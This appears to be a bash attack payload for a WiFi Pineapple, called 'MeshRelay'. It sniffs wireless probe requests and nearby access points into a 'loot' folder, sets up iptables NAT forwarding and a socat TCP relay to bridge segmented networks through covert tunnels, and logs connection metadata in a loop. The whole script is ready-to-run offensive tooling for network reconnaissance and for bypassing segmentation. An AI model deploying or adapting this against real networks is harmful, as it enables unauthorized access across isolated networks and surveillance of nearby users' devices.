#!/bin/bash
# ═══════════════════════════════════════════════════════════════════════════════
# Title:         MeshRelay
# Description:   Deploys a mesh relay node that bridges isolated networks
#                through the Pineapple, creating persistent covert tunnels
#                between segmented VLANs or air-gapped adjacent networks.
# Author:        bad-antics
# Category:      attack
# Version:       1.0
# ═══════════════════════════════════════════════════════════════════════════════

LOOT_DIR="/mmc/nullsec/MeshRelay"
LOG_FILE="${LOOT_DIR}/meshrelay.log"
RELAY_PORT=8477
TUNNEL_IFACE="wlan1"

# Logging
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Setup
setup() {
    mkdir -p "$LOOT_DIR"
    log "MeshRelay starting..."

    # Check dependencies
    for cmd in socat iptables ip; do
        if ! command -v "$cmd" &>/dev/null; then
            log "ERROR: $cmd not found"
            exit 1
        fi
    done

    log "Dependencies verified"
}

# Discover adjacent networks by scanning nearby SSIDs and probe requests
discover_networks() {
    log "Discovering adjacent networks..."

    # Capture probe requests to find networks clients are looking for
    timeout 30 tcpdump -i "$TUNNEL_IFACE" -e 'type mgt subtype probe-req' -c 100 2>/dev/null | \
        grep -oP 'Probe Request \(\K[^)]+' | sort -u > "${LOOT_DIR}/probe_targets.txt"

    PROBE_COUNT=$(wc -l < "${LOOT_DIR}/probe_targets.txt" 2>/dev/null || echo 0)
    log "Captured $PROBE_COUNT unique probe request targets"

    # Scan visible APs
    iwlist wlan0 scan 2>/dev/null | grep -E 'ESSID|Channel|Signal' > "${LOOT_DIR}/visible_aps.txt"
    AP_COUNT=$(grep -c "ESSID" "${LOOT_DIR}/visible_aps.txt" 2>/dev/null || echo 0)
    log "Found $AP_COUNT visible access points"
}

# Setup relay bridge between interfaces
setup_relay() {
    log "Setting up mesh relay bridge..."

    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward

    # Get interface IPs
    LOCAL_NET=$(ip -4 addr show wlan0 | grep -oP 'inet \K[\d.]+/\d+' | head -1)
    log "Local network: $LOCAL_NET"

    # Setup NAT masquerading for traffic forwarding
    iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
    iptables -A FORWARD -i "$TUNNEL_IFACE" -o wlan0 -j ACCEPT
    iptables -A FORWARD -i wlan0 -o "$TUNNEL_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT

    log "NAT relay bridge configured"

    # Start socat relay for TCP tunnel
    socat TCP-LISTEN:${RELAY_PORT},reuseaddr,fork TCP:192.168.1.1:80 &
    RELAY_PID=$!
    log "TCP relay started on port $RELAY_PORT (PID: $RELAY_PID)"
}

# Monitor relay traffic
monitor_relay() {
    log "Monitoring relay traffic..."

    while true; do
        # Log connection stats
        CONNECTIONS=$(ss -tn state established | grep ":${RELAY_PORT}" | wc -l)
        BYTES_FWD=$(iptables -L FORWARD -v -n 2>/dev/null | awk 'NR>2{sum+=$2}END{print sum+0}')

        echo "[$(date '+%H:%M:%S')] Connections: $CONNECTIONS | Bytes forwarded: $BYTES_FWD" >> "${LOOT_DIR}/relay_stats.log"

        # Capture interesting traffic metadata (no content, just flow data)
        ss -tn state established 2>/dev/null | grep -v "Local" >> "${LOOT_DIR}/connections.log"

        sleep 10
    done
}

# Cleanup
cleanup() {
    log "MeshRelay shutting down..."

    # Remove iptables rules
    iptables -t nat -D POSTROUTING -o wlan0 -j MASQUERADE 2>/dev/null
    iptables -D FORWARD -i "$TUNNEL_IFACE" -o wlan0 -j ACCEPT 2>/dev/null

    # Kill relay processes
    kill "$RELAY_PID" 2>/dev/null
    pkill -f "socat.*${RELAY_PORT}" 2>/dev/null

    # Disable forwarding
    echo 0 > /proc/sys/net/ipv4/ip_forward

    log "Cleanup complete. Loot saved to $LOOT_DIR"
}

trap cleanup EXIT

# Main
setup
discover_networks
setup_relay
monitor_relay
